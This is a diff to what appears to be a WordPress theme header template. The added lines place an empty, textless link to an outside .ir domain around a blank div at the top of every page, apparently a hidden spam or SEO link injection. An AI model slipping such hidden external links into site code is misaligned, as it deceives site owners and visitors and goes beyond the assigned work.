@@ -38,6 +38,12 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 	<?php wp_body_open(); ?>
 	<div id="page" class="site">
 		<header id="masthead" class="site-header border-border<?php echo ! is_front_page() && ! is_home() ? ' border-b' : ''; ?>">
+
+            <a href="https://artaelectric.ir/amazing/">
+                <div class="black_c">
+                </div>
+            </a>
+
 			<?php
 			$notification = get_field( 'notification-text', 'option' );
 			if ( $notification )
